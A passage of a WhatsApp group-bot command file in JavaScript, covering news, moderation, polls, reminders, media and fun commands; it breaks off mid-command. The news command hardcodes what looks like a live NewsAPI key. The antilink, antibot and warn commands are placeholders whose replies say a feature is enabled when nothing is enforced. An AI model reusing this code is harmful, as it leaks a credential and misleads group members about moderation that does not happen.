}, async (dest, hn, context) => {
  const { repondre, from } = context;

  try {
    const apiKey = "0f2c43ab11324578a7b1709651736382";
    const response = await axios.get(`https://newsapi.org/v2/top-headlines?country=us&apiKey=${apiKey}`);
    const articles = response.data.articles;

    if (!articles.length) {
      return repondre("No news articles found.");
    }

    // Send each article as a separate message with image and title
    for (let i = 0; i < Math.min(articles.length, 5); i++) {
      const article = articles[i];
      let message = `
📰 *${article.title}*
📝 _${article.description}_
🔗 _${article.url}_

> © Powered by ${conf.BOT}
      `;

      console.log('Article URL:', article.urlToImage); // Log image URL for debugging

      if (article.urlToImage) {
        // Send image with caption
        await hn.sendMessage(dest, { image: { url: article.urlToImage }, caption: message });
      } else {
        // Send text message if no image is available
        await hn.sendMessage(dest, { text: message });
      }
    }
  } catch (e) {
    console.error("Error fetching news:", e);
    repondre("Could not fetch news. Please try again later.");
  }
});

hango({
  nomCom: "groupinfo",
  aliases: ["ginfo", "infogroup"],
  desc: "Get detailed information about the current group",
  categorie: "group",
  reaction: '📊',
}, async (dest, hn, context) => {
  const { repondre } = context;
  
  try {
    // Check if command is used in a group
    if (!dest.isGroup) {
      return repondre("❌ This command can only be used in a group chat.");
    }
    
    // Get group metadata
    const groupMetadata = await hn.groupMetadata(dest.chat);
    const participants = groupMetadata.participants;
    
    // Count admins
    const adminCount = participants.filter(p => p.admin === 'admin' || p.admin === 'superadmin').length;
    
    // Format creation date
    const creationDate = new Date(groupMetadata.creation * 1000).toLocaleDateString();
    
    // Create group info message
    const infoMessage = `
📊 *GROUP INFORMATION*
📝 *Name:* ${groupMetadata.subject}
👥 *Members:* ${participants.length}
👑 *Admins:* ${adminCount}
🆔 *Group ID:* ${dest.chat}
📅 *Created On:* ${creationDate}
${groupMetadata.desc ? `📄 *Description:* ${groupMetadata.desc}` : ''}
    `;
    
    await repondre(infoMessage);
  } catch (error) {
    console.error("Error in groupinfo command:", error);
    await repondre("❌ An error occurred while fetching group information.");
  }
});

hango({
  nomCom: "tagall",
  aliases: ["mentionall", "everyone"],
  desc: "Tag all members in the group",
  categorie: "group",
  reaction: '📢',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  
  try {
    // Check if command is used in a group
    if (!dest.isGroup) {
      return repondre("❌ This command can only be used in a group chat.");
    }
    
    // Check if user is admin
    const groupMetadata = await hn.groupMetadata(dest.chat);
    const participants = groupMetadata.participants;
    const isAdmin = participants.find(p => p.id === dest.sender && (p.admin === 'admin' || p.admin === 'superadmin'));
    
    if (!isAdmin) {
      return repondre("❌ Only group admins can use this command.");
    }
    
    // Get message to announce (if any)
    const message = arg.join(" ") || "Attention everyone!";
    
    // Create mentions array and message
    const mentions = participants.map(p => p.id);
    let mentionText = `📢 *${message}*\n\n`;
    
    participants.forEach(participant => {
      mentionText += `@${participant.id.split('@')[0]}\n`;
    });
    
    await hn.sendMessage(dest.chat, {
      text: mentionText,
      mentions: mentions
    });
  } catch (error) {
    console.error("Error in tagall command:", error);
    await repondre("❌ An error occurred while tagging group members.");
  }
});

hango({
  nomCom: "promote",
  aliases: ["makeadmin", "admin"],
  desc: "Promote a member to admin",
  categorie: "group",
  reaction: '👑',
}, async (dest, hn, context) => {
  const { repondre } = context;
  
  try {
    // Check if command is used in a group
    if (!dest.isGroup) {
      return repondre("❌ This command can only be used in a group chat.");
    }
    
    // Check if user is admin
    const groupMetadata = await hn.groupMetadata(dest.chat);
    const isAdmin = groupMetadata.participants.find(p => p.id === dest.sender && (p.admin === 'admin' || p.admin === 'superadmin'));
    
    if (!isAdmin) {
      return repondre("❌ Only group admins can use this command.");
    }
    
    // Check if a member is tagged
    if (!dest.quoted) {
      return repondre("❌ Tag a member to promote by replying to their message.");
    }
    
    const targetId = dest.quoted.sender;
    
    // Check if target is already admin
    const isTargetAdmin = groupMetadata.participants.find(p => p.id === targetId && (p.admin === 'admin' || p.admin === 'superadmin'));
    
    if (isTargetAdmin) {
      return repondre("❌ This user is already an admin.");
    }
    
    // Promote the member
    await hn.groupParticipantsUpdate(dest.chat, [targetId], "promote");
    
    await repondre(`👑 User @${targetId.split('@')[0]} has been promoted to admin.`, {
      mentions: [targetId]
    });
  } catch (error) {
    console.error("Error in promote command:", error);
    await repondre("❌ An error occurred while promoting the member.");
  }
});

hango({
  nomCom: "demote",
  aliases: ["removeadmin", "unadmin"],
  desc: "Demote an admin to member",
  categorie: "group",
  reaction: '👤',
}, async (dest, hn, context) => {
  const { repondre } = context;
  
  try {
    // Check if command is used in a group
    if (!dest.isGroup) {
      return repondre("❌ This command can only be used in a group chat.");
    }
    
    // Check if user is admin
    const groupMetadata = await hn.groupMetadata(dest.chat);
    const isAdmin = groupMetadata.participants.find(p => p.id === dest.sender && (p.admin === 'admin' || p.admin === 'superadmin'));
    
    if (!isAdmin) {
      return repondre("❌ Only group admins can use this command.");
    }
    
    // Check if a member is tagged
    if (!dest.quoted) {
      return repondre("❌ Tag an admin to demote by replying to their message.");
    }
    
    const targetId = dest.quoted.sender;
    
    // Check if target is an admin
    const isTargetAdmin = groupMetadata.participants.find(p => p.id === targetId && (p.admin === 'admin' || p.admin === 'superadmin'));
    
    if (!isTargetAdmin) {
      return repondre("❌ This user is not an admin.");
    }
    
    // Demote the admin
    await hn.groupParticipantsUpdate(dest.chat, [targetId], "demote");
    
    await repondre(`👤 User @${targetId.split('@')[0]} has been demoted to member.`, {
      mentions: [targetId]
    });
  } catch (error) {
    console.error("Error in demote command:", error);
    await repondre("❌ An error occurred while demoting the admin.");
  }
});

hango({
  nomCom: "kick",
  aliases: ["remove", "ban"],
  desc: "Remove a member from the group",
  categorie: "group",
  reaction: '🚫',
}, async (dest, hn, context) => {
  const { repondre } = context;
  
  try {
    // Check if command is used in a group
    if (!dest.isGroup) {
      return repondre("❌ This command can only be used in a group chat.");
    }
    
    // Check if user is admin
    const groupMetadata = await hn.groupMetadata(dest.chat);
    const isAdmin = groupMetadata.participants.find(p => p.id === dest.sender && (p.admin === 'admin' || p.admin === 'superadmin'));
    
    if (!isAdmin) {
      return repondre("❌ Only group admins can use this command.");
    }
    
    // Check if a member is tagged
    if (!dest.quoted) {
      return repondre("❌ Tag a member to remove by replying to their message.");
    }
    
    const targetId = dest.quoted.sender;
    
    // Check if target is the bot
    if (targetId === hn.user.id) {
      return repondre("❌ I cannot remove myself from the group.");
    }
    
    // Check if target is an admin
    const isTargetAdmin = groupMetadata.participants.find(p => p.id === targetId && (p.admin === 'admin' || p.admin === 'superadmin'));
    
    if (isTargetAdmin) {
      return repondre("❌ Cannot remove an admin from the group.");
    }
    
    // Remove the member
    await hn.groupParticipantsUpdate(dest.chat, [targetId], "remove");
    
    await repondre(`🚫 User @${targetId.split('@')[0]} has been removed from the group.`, {
      mentions: [targetId]
    });
  } catch (error) {
    console.error("Error in kick command:", error);
    await repondre("❌ An error occurred while removing the member.");
  }
});

hango({
  nomCom: "groupsettings",
  aliases: ["setgroup", "editgroup"],
  desc: "Change group settings (name, description, etc.)",
  categorie: "group",
  reaction: '⚙️',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  
  try {
    // Check if command is used in a group
    if (!dest.isGroup) {
      return repondre("❌ This command can only be used in a group chat.");
    }
    
    // Check if user is admin
    const groupMetadata = await hn.groupMetadata(dest.chat);
    const isAdmin = groupMetadata.participants.find(p => p.id === dest.sender && (p.admin === 'admin' || p.admin === 'superadmin'));
    
    if (!isAdmin) {
      return repondre("❌ Only group admins can use this command.");
    }
    
    // Check for valid setting and value
    if (arg.length < 2) {
      return repondre(`
❌ Please specify a setting and value.

📝 *Usage:*
• .groupsettings name [new name]
• .groupsettings desc [new description]
• .groupsettings lock (lock group settings)
• .groupsettings unlock (unlock group settings)
      `);
    }
    
    const setting = arg[0].toLowerCase();
    const value = arg.slice(1).join(" ");
    
    switch (setting) {
      case 'name':
        await hn.groupUpdateSubject(dest.chat, value);
        await repondre(`✅ Group name changed to: *${value}*`);
        break;
        
      case 'desc':
        await hn.groupUpdateDescription(dest.chat, value);
        await repondre(`✅ Group description updated.`);
        break;
        
      case 'lock':
        await hn.groupSettingUpdate(dest.chat, 'locked');
        await repondre(`🔒 Group settings have been locked. Only admins can change group info now.`);
        break;
        
      case 'unlock':
        await hn.groupSettingUpdate(dest.chat, 'unlocked');
        await repondre(`🔓 Group settings have been unlocked. All members can change group info now.`);
        break;
        
      default:
        await repondre(`
❌ Invalid setting. Available options:

📝 *Usage:*
• .groupsettings name [new name]
• .groupsettings desc [new description]
• .groupsettings lock (lock group settings)
• .groupsettings unlock (unlock group settings)
        `);
    }
  } catch (error) {
    console.error("Error in groupsettings command:", error);
    await repondre("❌ An error occurred while updating group settings.");
  }
});

hango({
  nomCom: "poll",
  aliases: ["vote", "createpoll"],
  desc: "Create a poll in the group",
  categorie: "group",
  reaction: '📊',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  
  try {
    // Check if command is used in a group
    if (!dest.isGroup) {
      return repondre("❌ This command can only be used in a group chat.");
    }
    
    // Check arguments
    if (arg.length < 3) {
      return repondre(`
❌ Please provide a question and at least 2 options.

📝 *Usage:*
.poll What's your favorite color? | Red | Blue | Green | Yellow
      `);
    }
    
    // Parse the poll data
    const pollData = arg.join(" ").split("|").map(item => item.trim());
    const question = pollData[0];
    const options = pollData.slice(1);
    
    if (options.length < 2) {
      return repondre("❌ Please provide at least 2 options separated by | symbol.");
    }
    
    // Create and send the poll
    await hn.sendMessage(dest.chat, {
      poll: {
        name: question,
        values: options,
        selectableCount: 1
      }
    });
  } catch (error) {
    console.error("Error in poll command:", error);
    await repondre("❌ An error occurred while creating the poll. Make sure you're using the correct format: question | option1 | option2 | ...");
  }
});

// Fun and utility commands

hango({
  nomCom: "tts",
  aliases: ["speak", "say"],
  desc: "Convert text to speech",
  categorie: "utility",
  reaction: '🔊',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  
  try {
    const text = arg.join(" ");
    
    if (!text) {
      return repondre("❌ Please provide text to convert to speech.");
    }
    
    // Create TTS URL with Google Translate API
    const ttsUrl = `https://translate.google.com/translate_tts?ie=UTF-8&q=${encodeURIComponent(text)}&tl=en&client=tw-ob`;
    
    // Send audio
    await hn.sendMessage(dest.chat, {
      audio: { url: ttsUrl },
      mimetype: 'audio/mp4',
      ptt: true
    });
  } catch (error) {
    console.error("Error in tts command:", error);
    await repondre("❌ An error occurred while generating speech.");
  }
});

hango({
  nomCom: "weather",
  aliases: ["forecast", "climate"],
  desc: "Get weather information for a location",
  categorie: "utility",
  reaction: '🌤️',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  
  try {
    const location = arg.join(" ");
    
    if (!location) {
      return repondre("❌ Please provide a location to check weather for.");
    }
    
    // Use OpenWeatherMap API (you need to add API key to conf)
    const apiKey = conf.WEATHER_API_KEY || "your_openweathermap_api_key";
    const weatherUrl = `https://api.openweathermap.org/data/2.5/weather?q=${encodeURIComponent(location)}&units=metric&appid=${apiKey}`;
    
    const response = await axios.get(weatherUrl);
    const data = response.data;
    
    const weatherInfo = `
🌤️ *Weather in ${data.name}, ${data.sys.country}*

🌡️ *Temperature:* ${Math.round(data.main.temp)}°C
🌡️ *Feels like:* ${Math.round(data.main.feels_like)}°C
💧 *Humidity:* ${data.main.humidity}%
💨 *Wind:* ${data.wind.speed} m/s
☁️ *Conditions:* ${data.weather[0].description}
    `;
    
    await repondre(weatherInfo);
  } catch (error) {
    console.error("Error in weather command:", error);
    await repondre("❌ Could not fetch weather information. Make sure the location name is correct.");
  }
});

hango({
  nomCom: "sticker",
  aliases: ["stiker", "s"],
  desc: "Convert image, video or GIF to sticker",
  categorie: "utility",
  reaction: '🖼️',
}, async (dest, hn, context) => {
  const { repondre } = context;
  
  try {
    if (!dest.quoted) {
      return repondre("❌ Reply to an image, video or GIF to convert it to a sticker.");
    }
    
    // Check if quoted message contains media
    const quotedMessage = dest.quoted;
    if (!quotedMessage.image && !quotedMessage.video) {
      return repondre("❌ Please reply to an image, short video or GIF.");
    }
    
    // Download the media
    const media = await quotedMessage.download();
    
    // Send as sticker
    await hn.sendMessage(dest.chat, {
      sticker: media,
      author: "Created by Bot",
      pack: "WhatsApp Sticker"
    }, { quoted: context.ms });
    
  } catch (error) {
    console.error("Error in sticker command:", error);
    await repondre("❌ An error occurred while creating the sticker.");
  }
});

hango({
  nomCom: "reminder",
  aliases: ["remind", "remindme"],
  desc: "Set a reminder",
  categorie: "utility",
  reaction: '⏰',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  
  try {
    if (arg.length < 2) {
      return repondre(`
❌ Please specify time and reminder text.

📝 *Usage:*
.reminder 5m Call mom
.reminder 2h Meeting with client
.reminder 1d Birthday party

*Time units:* s (seconds), m (minutes), h (hours), d (days)
      `);
    }
    
    // Parse time
    const timeArg = arg[0].toLowerCase();
    const reminderText = arg.slice(1).join(" ");
    
    // Extract number and unit
    const match = timeArg.match(/^(\d+)([smhd])$/);
    
    if (!match) {
      return repondre("❌ Invalid time format. Use format like: 5m, 2h, 1d");
    }
    
    const timeValue = parseInt(match[1]);
    const timeUnit = match[2];
    
    // Convert to milliseconds
    let timeMs = 0;
    switch (timeUnit) {
      case 's': timeMs = timeValue * 1000; break;
      case 'm': timeMs = timeValue * 60 * 1000; break;
      case 'h': timeMs = timeValue * 60 * 60 * 1000; break;
      case 'd': timeMs = timeValue * 24 * 60 * 60 * 1000; break;
    }
    
    // Confirm reminder set
    await repondre(`⏰ Reminder set for ${timeArg} from now.`);
    
    // Set timeout for reminder
    setTimeout(async () => {
      await hn.sendMessage(dest.chat, {
        text: `⏰ *REMINDER*\n\n${reminderText}\n\n_Reminder set ${timeArg} ago_`,
        mentions: [dest.sender]
      });
    }, timeMs);
    
  } catch (error) {
    console.error("Error in reminder command:", error);
    await repondre("❌ An error occurred while setting the reminder.");
  }
});

// AI and media commands

hango({
  nomCom: "ytmp3",
  aliases: ["mp3", "ytaudio"],
  desc: "Download YouTube audio",
  categorie: "media",
  reaction: '🎵',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  
  try {
    const url = arg[0];
    
    if (!url) {
      return repondre("❌ Please provide a YouTube video URL.");
    }
    
    if (!url.match(/^(https?:\/\/)?(www\.)?(youtube\.com|youtu\.be)/)) {
      return repondre("❌ Please provide a valid YouTube URL.");
    }
    
    await repondre("⏳ Processing your request. This may take a moment...");
    
    // Use a YouTube download service API
    const ytDlUrl = `https://loader.to/api/button/?url=${encodeURIComponent(url)}&f=mp3`;
    
    // Get video info
    const info = await ytdl.getInfo(url);
    const videoTitle = info.videoDetails.title;
    const thumbnail = info.videoDetails.thumbnails[0].url;
    
    // Send audio with thumbnail
    await hn.sendMessage(dest.chat, {
      audio: { url: ytDlUrl },
      mimetype: 'audio/mpeg',
      fileName: `${videoTitle}.mp3`,
      contextInfo: {
        externalAdReply: {
          title: videoTitle,
          body: "YouTube MP3",
          thumbnailUrl: thumbnail,
          sourceUrl: url
        }
      }
    });
    
  } catch (error) {
    console.error("Error in ytmp3 command:", error);
    await repondre("❌ An error occurred while downloading the audio.");
  }
});

hango({
  nomCom: "quote",
  aliases: ["quotegen", "inspire"],
  desc: "Get an inspirational quote",
  categorie: "fun",
  reaction: '💭',
}, async (dest, hn, context) => {
  const { repondre } = context;
  
  try {
    // Call API to get a random quote
    const response = await axios.get('https://api.quotable.io/random');
    const { content, author } = response.data;
    
    await repondre(`💭 *"${content}"*\n\n— *${author}*`);
  } catch (error) {
    console.error("Error in quote command:", error);
    await repondre("❌ An error occurred while fetching a quote.");
  }
});

hango({
  nomCom: "joke",
  aliases: ["telljoke", "funny"],
  desc: "Get a random joke",
  categorie: "fun",
  reaction: '😂',
}, async (dest, hn, context) => {
  const { repondre } = context;
  
  try {
    // Here we would normally fetch from an API
    // This is a simulation with a few hardcoded jokes
    const jokes = [
      "Why don't scientists trust atoms? Because they make up everything!",
      "What's the best thing about Switzerland? I don't know, but the flag is a big plus.",
      "Did you hear about the mathematician who's afraid of negative numbers? He'll stop at nothing to avoid them.",
      "Why was the math book sad? Because it had too many problems.",
      "I told my wife she was drawing her eyebrows too high. She looked surprised.",
      "What do you call a fake noodle? An impasta!",
      "Why did the scarecrow win an award? Because he was outstanding in his field!",
      "I'm reading a book about anti-gravity. It's impossible to put down!",
      "I used to be a baker, but I couldn't make enough dough.",
      "Why don't eggs tell jokes? They'd crack each other up."
    ];
    
    const randomJoke = jokes[Math.floor(Math.random() * jokes.length)];
    await repondre(`😂 *JOKE TIME*\n\n${randomJoke}`);
  } catch (error) {
    console.error("Error in joke command:", error);
    repondre("❌ Failed to tell a joke. My sense of humor crashed.");
  }
});

hango({
  nomCom: "antilink",
  aliases: ["nolinks", "disablelinks"],
  desc: "Toggle anti-link feature in the group",
  categorie: "group",
  reaction: '🔗',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  
  try {
    // Check if command is used in a group
    if (!dest.isGroup) {
      return repondre("❌ This command can only be used in a group chat.");
    }
    
    // Check if user is admin
    const groupMetadata = await hn.groupMetadata(dest.chat);
    const isAdmin = groupMetadata.participants.find(p => p.id === dest.sender && (p.admin === 'admin' || p.admin === 'superadmin'));
    
    if (!isAdmin) {
      return repondre("❌ Only group admins can use this command.");
    }
    
    // Toggle antilink mode
    const status = arg[0]?.toLowerCase();
    
    if (!status || !['on', 'off'].includes(status)) {
      return repondre("❌ Please specify whether to turn antilink on or off. Example: .antilink on");
    }
    
    // In a full implementation, you would save this setting to a database
    // This is a placeholder implementation
    if (status === 'on') {
      // Enable antilink
      repondre("✅ Anti-link feature has been *enabled*. Links sent by non-admins will be deleted.");
    } else {
      // Disable antilink
      repondre("✅ Anti-link feature has been *disabled*. Members can now send links.");
    }
  } catch (error) {
    console.error("Error in antilink command:", error);
    repondre("❌ An error occurred while toggling the anti-link feature.");
  }
});

hango({
  nomCom: "warn",
  aliases: ["warning", "warnuser"],
  desc: "Warn a group member",
  categorie: "group",
  reaction: '⚠️',
}, async (dest, hn, context) => {
  const { repondre } = context;
  
  try {
    // Check if command is used in a group
    if (!dest.isGroup) {
      return repondre("❌ This command can only be used in a group chat.");
    }
    
    // Check if user is admin
    const groupMetadata = await hn.groupMetadata(dest.chat);
    const isAdmin = groupMetadata.participants.find(p => p.id === dest.sender && (p.admin === 'admin' || p.admin === 'superadmin'));
    
    if (!isAdmin) {
      return repondre("❌ Only group admins can use this command.");
    }
    
    // Check if a member is tagged
    if (!dest.quoted) {
      return repondre("❌ Tag a member to warn by replying to their message.");
    }
    
    const targetId = dest.quoted.sender;
    
    // Check if target is the bot
    if (targetId === hn.user.id) {
      return repondre("❌ I cannot warn myself.");
    }
    
    // Check if target is an admin
    const isTargetAdmin = groupMetadata.participants.find(p => p.id === targetId && (p.admin === 'admin' || p.admin === 'superadmin'));
    
    if (isTargetAdmin) {
      return repondre("❌ Cannot warn an admin.");
    }
    
    // In a full implementation, you would track warnings in a database
    // This is a placeholder implementation
    await repondre(`⚠️ @${targetId.split('@')[0]} has been *warned*.\nFurther violations may result in removal from the group.`, {
      mentions: [targetId]
    });
  } catch (error) {
    console.error("Error in warn command:", error);
    repondre("❌ An error occurred while warning the member.");
  }
});

hango({
  nomCom: "revoke",
  aliases: ["resetlink", "newlink"],
  desc: "Revoke the group invite link",
  categorie: "group",
  reaction: '🔄',
}, async (dest, hn, context) => {
  const { repondre } = context;
  
  try {
    // Check if command is used in a group
    if (!dest.isGroup) {
      return repondre("❌ This command can only be used in a group chat.");
    }
    
    // Check if user is admin
    const groupMetadata = await hn.groupMetadata(dest.chat);
    const isAdmin = groupMetadata.participants.find(p => p.id === dest.sender && (p.admin === 'admin' || p.admin === 'superadmin'));
    
    if (!isAdmin) {
      return repondre("❌ Only group admins can use this command.");
    }
    
    // Revoke the group link
    await hn.groupRevokeInvite(dest.chat);
    
    repondre("✅ Group invite link has been revoked. Use .grouplink to get the new link.");
  } catch (error) {
    console.error("Error in revoke command:", error);
    repondre("❌ An error occurred while revoking the group link.");
  }
});

hango({
  nomCom: "grouplink",
  aliases: ["getlink", "invitelink"],
  desc: "Get the group invite link",
  categorie: "group",
  reaction: '🔗',
}, async (dest, hn, context) => {
  const { repondre } = context;
  
  try {
    // Check if command is used in a group
    if (!dest.isGroup) {
      return repondre("❌ This command can only be used in a group chat.");
    }
    
    // Check if user is admin
    const groupMetadata = await hn.groupMetadata(dest.chat);
    const isAdmin = groupMetadata.participants.find(p => p.id === dest.sender && (p.admin === 'admin' || p.admin === 'superadmin'));
    
    if (!isAdmin) {
      return repondre("❌ Only group admins can use this command.");
    }
    
    // Get the group invite link
    const code = await hn.groupInviteCode(dest.chat);
    const link = `https://chat.whatsapp.com/${code}`;
    
    repondre(`🔗 *Group Invite Link*\n\n${link}`);
  } catch (error) {
    console.error("Error in grouplink command:", error);
    repondre("❌ An error occurred while getting the group link.");
  }
});

hango({
  nomCom: "antibot",
  aliases: ["nobot", "antibots"],
  desc: "Toggle anti-bot feature in the group",
  categorie: "group",
  reaction: '🤖',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  
  try {
    // Check if command is used in a group
    if (!dest.isGroup) {
      return repondre("❌ This command can only be used in a group chat.");
    }
    
    // Check if user is admin
    const groupMetadata = await hn.groupMetadata(dest.chat);
    const isAdmin = groupMetadata.participants.find(p => p.id === dest.sender && (p.admin === 'admin' || p.admin === 'superadmin'));
    
    if (!isAdmin) {
      return repondre("❌ Only group admins can use this command.");
    }
    
    // Toggle antibot mode
    const status = arg[0]?.toLowerCase();
    
    if (!status || !['on', 'off'].includes(status)) {
      return repondre("❌ Please specify whether to turn antibot on or off. Example: .antibot on");
    }
    
    // In a full implementation, you would save this setting to a database
    // This is a placeholder implementation
    if (status === 'on') {
      // Enable antibot
      repondre("✅ Anti-bot feature has been *enabled*. Other bots will be removed when detected.");
    } else {
      // Disable antibot
      repondre("✅ Anti-bot feature has been *disabled*. Other bots are now allowed.");
    }
  } catch (error) {
    console.error("Error in antibot command:", error);
    repondre("❌ An error occurred while toggling the anti-bot feature.");
  }
});

hango({
  nomCom: "mute",
  aliases: ["mutegroup", "silence"],
  desc: "Mute the group for non-admins",
  categorie: "group",
  reaction: '🔇',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  
  try {
    // Check if command is used in a group
    if (!dest.isGroup) {
      return repondre("❌ This command can only be used in a group chat.");
    }
    
    // Check if user is admin
    const groupMetadata = await hn.groupMetadata(dest.chat);
    const isAdmin = groupMetadata.participants.find(p => p.id === dest.sender && (p.admin === 'admin' || p.admin === 'superadmin'));
    
    if (!isAdmin) {
      return repondre("❌ Only group admins can use this command.");
    }
    
    // Set group to admins-only mode
    await hn.groupSettingUpdate(dest.chat, 'announcement');
    
    repondre("🔇 Group has been *muted*. Only admins can send messages now.");
  } catch (error) {
    console.error("Error in mute command:", error);
    repondre("❌ An error occurred while muting the group.");
  }
});

hango({
  nomCom: "unmute",
  aliases: ["unmutegroup", "unsilence"],
  desc: "Unmute the group for all members",
  categorie: "group",
  reaction: '🔊',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  
  try {
    // Check if command is used in a group
    if (!dest.isGroup) {
      return repondre("❌ This command can only be used in a group chat.");
    }
    
    // Check if user is admin
    const groupMetadata = await hn.groupMetadata(dest.chat);
    const isAdmin = groupMetadata.participants.find(p => p.id === dest.sender && (p.admin === 'admin' || p.admin === 'superadmin'));
    
    if (!isAdmin) {
      return repondre("❌ Only group admins can use this command.");
    }
    
    // Set group to everyone mode
    await hn.groupSettingUpdate(dest.chat, 'not_announcement');
    
    repondre("🔊 Group has been *unmuted*. All members can send messages now.");
  } catch (error) {
    console.error("Error in unmute command:", error);
    repondre("❌ An error occurred while unmuting the group.");
  }
});

hango({
  nomCom: "admins",
  aliases: ["adminlist", "listadmins"],
  desc: "List all admins in the group",
  categorie: "group",
  reaction: '👑',
}, async (dest, hn, context) => {
  const { repondre } = context;
  
  try {
    // Check if command is used in a group
    if (!dest.isGroup) {
      return repondre("❌ This command can only be used in a group chat.");
    }
    
    // Get group metadata
    const groupMetadata = await hn.groupMetadata(dest.chat);
    const admins = groupMetadata.participants.filter(p => p.admin === 'admin' || p.admin === 'superadmin');
    
    if (admins.length === 0) {
      return repondre("❓ Strange, no admins found in this group.");
    }
    
    // Create admin list with mentions
    let message = `👑 *ADMIN LIST*\n\n`;
    
    admins.forEach((admin, i) => {
      message += `${i + 1}. @${admin.id.split('@')[0]}\n`;
    });
    
    const mentions = admins.map(a => a.id);
    
    await hn.sendMessage(dest.chat, {
      text: message,
      mentions: mentions
    });
  } catch (error) {
    console.error("Error in admins command:", error);
    repondre("❌ An error occurred while listing the admins.");
  }
});

hango({
  nomCom: "add",
  aliases: ["invite", "addmember"],
  desc: "Add a person to the group",
  categorie: "group",
  reaction: '➕',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  
  try {
    // Check if command is used in a group
    if (!dest.isGroup) {
      return repondre("❌ This command can only be used in a group chat.");
    }
    
    // Check if user is admin
    const groupMetadata = await hn.groupMetadata(dest.chat);
    const isAdmin = groupMetadata.participants.find(p => p.id === dest.sender && (p.admin === 'admin' || p.admin === 'superadmin'));
    
    if (!isAdmin) {
      return repondre("❌ Only group admins can use this command.");
    }
    
    // Check if number is provided
    if (arg.length === 0) {
      return repondre("❌ Please provide the phone number to add. Example: .add 1234567890");
    }
    
    let number = arg[0].replace(/[^0-9]/g, '');
    
    // Add country code if not present
    if (number.length <= 11) {
      number = '91' + number; // Assuming 91 for India, modify for your region
    }
    
    // Ensure number has @ format
    if (!number.includes('@')) {
      number = number + '@s.whatsapp.net';
    }
    
    // Add the member
    const response = await hn.groupParticipantsUpdate(dest.chat, [number], "add");
    
    if (response[0].status === "409") {
      return repondre("❌ The person is already in the group.");
    } else if (response[0].status === "403") {
      return repondre("❌ Failed to add. The person might have their privacy settings restricted.");
    } else if (response[0].status === "408") {
      return repondre("❌ Failed to add. The person might have left the group recently.");
    } else if (response[0].status === "200") {
      return repondre("✅ Successfully added to the group!");
    } else {
      return repondre("❌ Failed to add the person. Status: " + response[0].status);
    }
  } catch (error) {
    console.error("Error in add command:", error);
    repondre("❌ An error occurred while adding the member.");
  }
});

hango({
  nomCom: "groupdp",
  aliases: ["setdp", "groupicon"],
  desc: "Change the group profile picture",
  categorie: "group",
  reaction: '🖼️',
}, async (dest, hn, context) => {
  const { repondre } = context;
  
  try {
    // Check if command is used in a group
    if (!dest.isGroup) {
      return repondre("❌ This command can only be used in a group chat.");
    }
    
    // Check if user is admin
    const groupMetadata = await hn.groupMetadata(dest.chat);
    const isAdmin = groupMetadata.participants.find(p => p.id === dest.sender && (p.admin === 'admin' || p.admin === 'superadmin'));
    
    if (!isAdmin) {
      return repondre("❌ Only group admins can use this command.");
    }
    
    // Check if an image is quoted
    if (!dest.quoted || !dest.quoted.image) {
      return repondre("❌ Please reply to an image to set as group icon.");
    }
    
    // Download the image
    const media = await dest.quoted.download();
    
    // Set as group icon
    await hn.updateProfilePicture(dest.chat, media);
    
    repondre("✅ Group icon has been updated successfully!");
  } catch (error) {
    console.error("Error in groupdp command:", error);
    repondre("❌ An error occurred while changing the group icon.");
  }
});

hango({
  nomCom: "hidetag",
  aliases: ["htag", "secretmention"],
  desc: "Mention everyone without showing tag list",
  categorie: "group",
  reaction: '👥',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  
  try {
    // Check if command is used in a group
    if (!dest.isGroup) {
      return repondre("❌ This command can only be used in a group chat.");
    }
    
    // Check if user is admin
    const groupMetadata = await hn.groupMetadata(dest.chat);
    const isAdmin = groupMetadata.participants.find(p => p.id === dest.sender && (p.admin === 'admin' || p.admin === 'superadmin'));
    
    if (!isAdmin) {
      return repondre("❌ Only group admins can use this command.");
    }
    
    // Get message to announce (if any)
    const message = arg.join(" ") || "Important announcement!";
    
    // Get all members for mentions
    const mentions = groupMetadata.participants.map(p => p.id);
    
    // Send message with hidden tags
    await hn.sendMessage(dest.chat, {
      text: message,
      mentions: mentions
    });
  } catch (error) {
    console.error("Error in hidetag command:", error);
    repondre("❌ An error occurred while sending the hidden tag message.");
  }
});

hango({
  nomCom: "leave",
  aliases: ["leavegroup", "botleave"],
  desc: "Make the bot leave the group",
  categorie: "group",
  reaction: '👋',
}, async (dest, hn, context) => {
  const { repondre } = context;
  
  try {
    // Check if command is used in a group
    if (!dest.isGroup) {
      return repondre("❌ This command can only be used in a group chat.");
    }
    
    // Check if user is admin or bot owner
    const isOwner = dest.sender === conf.owner;
    const groupMetadata = await hn.groupMetadata(dest.chat);
    const isAdmin = groupMetadata.participants.find(p => p.id === dest.sender && (p.admin === 'admin' || p.admin === 'superadmin'));
    
    if (!isAdmin && !isOwner) {
      return repondre("❌ Only group admins or the bot owner can use this command.");
    }
    
    // Send goodbye message
    await repondre("👋 It was nice being here. Goodbye everyone!");
    
    // Leave the group after a short delay
    setTimeout(async () => {
      await hn.groupLeave(dest.chat);
    }, 1000);
  } catch (error) {
    console.error("Error in leave command:", error);
    repondre("❌ An error occurred while leaving the group.");
  }
});

hango({
  nomCom: "announce",
  aliases: ["announcement", "broadcast"],
  desc: "Send a formatted announcement to the group",
  categorie: "group",
  reaction: '📢',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  
  try {
    // Check if command is used in a group
    if (!dest.isGroup) {
      return repondre("❌ This command can only be used in a group chat.");
    }
    
    // Check if user is admin
    const groupMetadata = await hn.groupMetadata(dest.chat);
    const isAdmin = groupMetadata.participants.find(p => p.id === dest.sender && (p.admin === 'admin' || p.admin === 'superadmin'));
    
    if (!isAdmin) {
      return repondre("❌ Only group admins can use this command.");
    }
    
    // Check if announcement text is provided
    if (arg.length === 0) {
      return repondre("❌ Please provide the announcement text.");
    }
    
    const announcement = arg.join(" ");
    
    // Format the announcement
